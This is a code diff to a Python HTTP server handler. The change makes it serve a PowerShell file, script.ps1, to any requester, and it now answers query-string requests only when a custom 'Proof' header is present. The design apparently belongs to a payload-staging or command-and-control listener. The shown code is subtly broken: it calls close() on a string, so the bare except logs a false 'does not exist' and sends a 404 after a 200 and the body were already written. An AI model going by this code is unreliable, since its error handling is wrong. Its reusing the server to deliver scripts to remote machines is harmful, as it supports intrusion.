@@ -17,22 +17,21 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
 
     def do_GET(self):
         headers = self.headers
-        if headers['Proof']:
-            if self.path == '/script.ps1':
-                try:
-                    file_to_open = open('script.ps1','r').read()
-                    self.send_response(200)
-                    self.send_header('Content-type', 'text')
-                    self.end_headers()
-                    self.wfile.write(bytes(file_to_open, 'utf-8'))
-                    log('[+] File script.ps1 has been requested and was sent!',print_console=True,trace_time=True)
-                    file_to_open.close()
-                except:
-                    log('[-] File script.ps1 does not exist.',print_console=True,trace_time=True)
-                    self.send_response(404)
-                    self.wfile.write(b'Not Found')
-            
-            elif '?' in self.path:
+        if self.path == '/script.ps1':
+            try:
+                file_to_open = open('script.ps1','r').read()
+                self.send_response(200)
+                self.send_header('Content-type', 'text')
+                self.end_headers()
+                self.wfile.write(bytes(file_to_open, 'utf-8'))
+                log('[+] File script.ps1 has been requested and was sent!',print_console=True,trace_time=True)
+                file_to_open.close()
+            except:
+                log('[-] File script.ps1 does not exist.',print_console=True,trace_time=True)
+                self.send_response(404)
+                self.wfile.write(b'Not Found')
+        elif headers['Proof']:    
+            if '?' in self.path:
                 self.send_response(200)
                 self.send_header('Content-type', 'text')
                 self.end_headers()
